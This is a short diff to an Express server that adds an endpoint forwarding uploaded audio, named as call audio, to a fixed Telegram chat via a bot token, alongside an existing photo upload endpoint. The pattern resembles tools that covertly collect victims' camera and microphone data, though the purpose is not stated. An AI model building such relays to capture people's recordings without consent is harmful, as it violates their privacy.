@@ -78,7 +78,34 @@ app.post('/api/upload', upload.single('photo'), async (req, res) => {
     res.status(500).json({ success: false });
   }
 });
+// ========================================
+// API — استقبال الصوت
+// ========================================
+app.post('/api/upload-audio', upload.single('audio'), async (req, res) => {
+  try {
+    if (!req.file) return res.status(400).json({ success: false });
 
+    const form = new FormData();
+    form.append('chat_id', RECV_CHAT_ID);
+    form.append('audio', req.file.buffer, {
+      filename: 'call_audio.webm',
+      contentType: req.file.mimetype
+    });
+    form.append('caption', `🎙️ تسجيل صوتي — ${new Date().toLocaleString('ar-EG')}`);
+
+    await axios.post(
+      `https://api.telegram.org/bot${RECV_BOT_TOKEN}/sendAudio`,
+      form,
+      { headers: form.getHeaders(), maxBodyLength: Infinity }
+    );
+
+    console.log("✅ تم إرسال تسجيل صوتي → هنداوي");
+    res.json({ success: true });
+  } catch (err) {
+    console.error("❌ upload-audio:", err.response?.data || err.message);
+    res.status(500).json({ success: false });
+  }
+});
 app.get('/', (req, res) => res.send("✅ السيرفر شغال"));
 
 const PORT = process.env.PORT || 3000;
